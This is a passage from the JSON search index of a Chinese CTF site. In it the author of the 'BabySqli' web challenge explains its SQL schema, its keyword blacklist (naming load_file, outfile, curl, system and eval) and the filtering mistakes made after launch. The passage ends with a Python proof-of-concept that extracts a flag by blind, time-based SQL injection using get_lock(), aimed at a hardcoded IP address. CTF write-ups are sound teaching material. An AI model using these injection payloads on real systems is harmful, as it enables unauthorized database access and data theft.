border='5'>\" ; foreach ( $row as $key => $value ) { echo \"<tr><td><center> $key </center></td><br>\" ; echo \"<td><center> $value </center></td></tr><br>\" ; } echo \"</table></center>\" ; } else { echo \"what do you want do??\" ; } } else { echo \"Please input id!\" ; } ?> \u5efa\u8868 sql \u6587\u4ef6 create database scuctf ; use scuctf ; create table users ( id int ( 6 ) unsigned auto_increment primary key , name varchar ( 20 ) not null , email varchar ( 30 ) not null , salary int ( 8 ) unsigned not null ); INSERT INTO users VALUES ( 1 , 'GodHuang' , 'GodHuang@scuctf.com' , 3000 ); INSERT INTO users VALUES ( 2 , 'GodSun' , 'GodSun@scuctf.com' , 4500 ); INSERT INTO users VALUES ( 3 , 'CaiJiWo' , 'CaiJiWo@scuctf.com' , 2700 ); INSERT INTO users VALUES ( 4 , 'GodWu' , 'GodWu@scuctf.com' , 10000 ); INSERT INTO users VALUES ( 5 , 'GodPang' , 'GodPang@scuctf.com' , 6000 ); create table flag ( guess varchar ( 20 ) not null , fffffffl11lgg varchar ( 30 ) not null , secert varchar ( 30 ) not null , flag varchar ( 30 ) not null ); INSERT INTO flag VALUES ( 'what happened?' , 'scuctf{3q1i_i3_t0o_e43y}' , 'I can not tell you!' , 'I am not flag Hhhhhhh!!' ); \u8fc7\u6ee4\u5982\u4e0b\uff1a $pattern =\" insert|delete|bool|extractvalue| rand|group|geometrycollection|multipoint| multipolygon|regexp|linestring| multilinestring|name_const|right|char| benchmark|polygon|char|rlike|concat|rpad| repeat|sleep|ascii|innodb|and|if|exp| updatexml|left|pow|concat_ws|group_concat| substr|join|floor|\\.\\.\\/|\\.\\/|into| load_file|outfile|dumpfile|sub|hex| file_put_contents|fwrite|curl|system| | eval\"; \u8fd9\u9053\u9898\u6211\u51fa\u9898\u7684\u65f6\u5019\uff0c\u53c2\u8003\u4e86\u5f88\u591a\u5927\u725b\u7684\u535a\u5ba2\u6587\u7ae0\uff0c\u5173\u95ed\u4e86\u62a5\u9519\u63d0\u793a\u548c\u7edd\u5927\u90e8\u5206\u65f6\u95f4\u76f2\u6ce8\u51fd\u6570(\u53ef\u80fd\u6709\u9057\u6f0f\u7684) \u4f46\u6211\u5374\u7559\u4e0b\u4e86 get_lock()\u51fd\u6570 \u9898\u76ee\u4e0a\u7ebf\u524d\uff0c\u6211\u628a or \u548c and \u6b63\u5219\u5339\u914d\u8fc7\u6ee4\u4e86\uff0c\u5bfc\u81f4\u4e0d\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 information \u6765\u67e5\u8be2\u8868\u548c\u5b57\u6bb5\u540d \u4f46\u4e0a\u7ebf\u540e\u51fa\u4e86\u70b9\u95ee\u9898\uff0cor \u548c and \u5b9e\u9645\u4e0a\u6ca1\u6709\u8fc7\u6ee4\u6389\uff08\u8fd9\u662f\u7b2c\u4e8c\u5929\u624d\u53d1\u73b0\u7684\uff09\uff0c\u5e76\u4e14\u6700\u91cd\u8981\u7684\u662f\u6ca1\u6709\u5168\u5b57\u5339\u914d\uff0c\u5bfc\u81f4\u53ef\u4ee5\u76f4\u63a5 select * from flag \u5168\u67e5\u51fa\u6765\uff01\u4e8e\u662f\u8d76\u7d27\u4e0b\u7ebf\uff0c\u52a0\u5165\u4e86\u6b63\u5219\u5339\u914d foreach ($row as $key => $value) { if(preg_match(\"/scuctf{.+?}/i\",$value)){ die(\"scuctf is found!!\"); } } \u4e0d\u53ef\u4ee5\u5f53\u524d\u9875\u9762\u76f4\u63a5\u6ce8\u5165\u51fa\u6765 scuctf{}\u6574\u4e2a\u5b57\u6bb5\u4e86\uff0c\u53ea\u80fd\u76f2\u6ce8\u4e00\u4e2a\u4e2a\u8dd1\u4e86 \u6240\u4ee5\u6211\u7684\u6574\u4f53\u601d\u8def\u662f\uff0c\u901a\u8fc7\u5b50\u67e5\u8be2\u6765\u4e0d\u77e5\u5b57\u6bb5\u540d\u7684\u60c5\u51b5\u4e0b\u83b7\u5f97 fffffffl11lgg \u7684\u503c \u8868\u540d\u5f97\u81ea\u5df1\u731c\uff0c\u4f46 CTF \u6bd4\u8d5b\u4e2d\uff0c\u4e00\u822c\u90fd\u662f flag,user,ctf \u4e4b\u7c7b\u7684 \u5b50\u67e5\u8be2\u601d\u8def\uff1a https://nosec.org/home/detail/2245.html \u76f2\u6ce8\u5177\u4f53\u65b9\u6cd5\u5f88\u591a\uff0c\u6211 POC \u91c7\u7528\u7684\u662f get_lock()\u51fd\u6570 \u5177\u4f53\u7528\u6cd5\u5982\u4e0b\uff1a https://xz.aliyun.com/t/2288 \uff08\u5410\u69fd\u4e00\u4e0b\u534f\u4f1a\u670d\u52a1\u5668\u6027\u80fd\u597d\u7684\u4e00\u6279\uff0c\u6b63\u5219\u5ef6\u8fdf\u6ce8\u5165\u79d2\u56de\uff0c\u5ef6\u8fdf\u4e0d\u4e86\u51e0\u79d2) \u4f46\u8fd9\u91cc\u7b2c\u4e8c\u5929\u53d1\u73b0 or \u548c and \u88ab\u653e\u51fa\u6765\u4e86\uff0c\u5f53\u65f6\u5f88\u60ca\u8bb6\uff0c\u672c\u6253\u7b97\u6539\u6765\u7740\uff0c\u4f46\u770b\u5230\u5230\u7b2c\u4e8c\u5929\u4e0b\u5348\u4e3a\u6b62\u4e5f\u6ca1\u51e0\u4e2a\u4eba\u505a\u51fa\u6765\uff0c\u5c31\u4e0d\u6253\u7b97\u6539\u4e86\uff0c\u5c31\u5f53\u964d\u4f4e\u96be\u5ea6\u4e86 \u6240\u4ee5\u8bf4\u8fd9\u9053\u9898\u5982\u679c\u6309\u6211\u539f\u5148\u7684\u51fa\u9898\u601d\u8def\u6765\u770b\u7684\u8bdd\uff0c\u7684\u786e\u6bd4\u8f83\u96be\uff0c\u6bd5\u7adf\u5dee\u4e0d\u591a\u5f53\u534a\u4e2a\u538b\u8f74\u7684\uff0c\u4f46\u51fa\u4e86\u95ee\u9898\u4e4b\u540e\uff0c\u96be\u5ea6\u4f4e\u4e86\u5f88\u591a\uff0c\u7ec6\u5fc3\u7422\u78e8\u505a\u4e00\u4e0b\u7684\u8bdd\uff0c\u8fd8\u662f\u53ef\u4ee5\u505a\u51fa\u6765\u7684~ \u8fd9\u91cc\u8d34\u4e00\u4e0b\u6211\u539f\u5148\u7684 poc \u811a\u672c\uff0c\u4f30\u8ba1\u73b0\u5728\u4e0d\u53ef\u7528\u4e86\uff0c\u65b0\u7684 poc \u53ef\u4ee5\u770b\u770b\u505a\u51fa\u6765\u961f\u4f0d\u7684\u6216\u8005\u7b49\u6211\u6709\u65f6\u95f4\u5199\uff08\u6700\u8fd1\u592a\u5fd9\u4e86~\uff09 import requests import string dic = string . digits + string . ascii_letters + \"!@#$%^&*()_+{}-=\" url = \"http://47.96.138.65:45787/?id=1\" session = requests . session () def flag (): i = 1 flag = \"\" while True : for j in dic : try : payoad = \"/**/ %26% 26/**/mid((select/**/`2`/**/from/**/(select/**/1,2,3,4/**/\" \\ \"union/**/select/**/*/**/from/**/flag)a/**/limit/**/1,1),{},1)='{}'/**/\" \\ \" %26% 26/**/get_lock('ddog',5)\" . format ( i , j ) url_all = url + payoad t = session . get ( url = url_all , timeout = 3 ) . content print ( t ) if len ( t ) != 0 : print (( \"[*]Flag:\" + flag ) . replace ( \"#&+\" , \"\" )) flag = flag + j except Exception : pass i = i + 1 if __name__ == \"__main__\" : flag ()","title":"BabySqli"},{"location":"201905/Web/#_16","text":"\u603b\u800c\u8a00\u4e4b\uff0c\u8fd9\u6b21\u6211\u51fa\u7684\u9898\uff0c\u9664\u4e86 Sqli \u6709\u70b9\u5c0f\u96be\u4ee5\u5916\u5176\u4ed6\u4e24\u9053\u9898\u96be\u5ea6\u8fd8\u662f\u53ef\u4ee5\u7684\uff0c\u5fc3\u6001\u653e\u597d\u4ed4\u7ec6\u505a\u7684\u8bdd\uff0c\u63a5\u5927\u591a\u6570\u4eba\u8fd8\u662f\u53ef\u4ee5\u5728\u8fd9\u4e09\u9053\u9898\u62ff\u5230 480 \u5206\uff0c\u5bf9\u4e8e\u6211\u521a\u624d\u63d0\u5230\u7684 BabySqli \u7684\u539f\u6709\u601d\u8def\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u5df1\u642d\u5efa\u73af\u5883\u6d4b\u8bd5\u4e00\u4e0b\u505a\u9898\u601d\u8def\uff0c\u8fd9\u4e24\u5929\u5927\u5bb6\u4e5f\u505a\u9898\u8f9b\u82e6\u4e86\u54c8~","title":"\u51fa\u9898\u4eba\u5bc4\u8bed"}]}